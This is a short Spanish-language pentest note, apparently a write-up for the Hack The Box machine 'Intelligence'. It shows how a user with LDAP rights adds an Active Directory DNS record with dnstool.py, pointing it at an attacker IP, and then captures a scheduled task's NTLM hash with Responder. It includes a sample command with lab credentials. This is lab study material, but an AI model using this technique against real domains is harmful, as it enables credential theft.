
## DESCRIPTION

Si tenemos un progroama que ejecuta una llamada una llamada a una web que necesita resolución de nombre. Entonces si tenemos un usuario con privilegios podemos añadir un record DNS usando LDAP para que nos llegue la llamada a nuestro servidor y asi interceptar el hash.

#### Mas información
* https://0xdf.gitlab.io/2021/11/27/htb-intelligence.html#smb-as-tedgraves

## EXPLOITATION

1. Si descubrimos qeu hay algun programa, o tarea programada que ejecuta una llamada a un nombre web y usa el login del Windows normal, entonces podemos añadir un entrada en la resolución de nombres de kerberos para que nos llegue a nosotros el hash del usuario.
Ejemplo código:

![[Pasted image 20230305154355.png]]
Vemos que:
- Coge los DNS record que empiecen por el nombre web*
- Hace una peticion a ese recurso → Podriamos conseguir el hash de ese usuario

2. Usamos  dnstool.py PARA → Add/modify/delete Active Directory Integrated DNS records via LDAP (el usuario tiene que tener permisos).

	Herramienta: DNSTOOL https://github.com/dirkjanm/krbrelayx.git

```
#Ejemplo:
python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --action add --record web-test --data 10.10.14.10 --type A 10.10.10.248
```

![[Pasted image 20230305155550.png]]

![[Pasted image 20230305155402.png]]

3. Nos ponemos a la escucha usando Responder.

![[Pasted image 20230305155432.png]]

**!!NOTA IMPORTANTE!!** 
* Utilizar python2
* NOTA SI LO QUE ESCUCHAMOS EN UN SERVIDOR HTTP → TENEMOS QUE PONERLO EN EL RESPONDER.CONF

![[Pasted image 20230305155505.png]]

4. Despues de un tiempo obtenemos los hashes.

## MACHINES

* Hack The Box: Intelligence
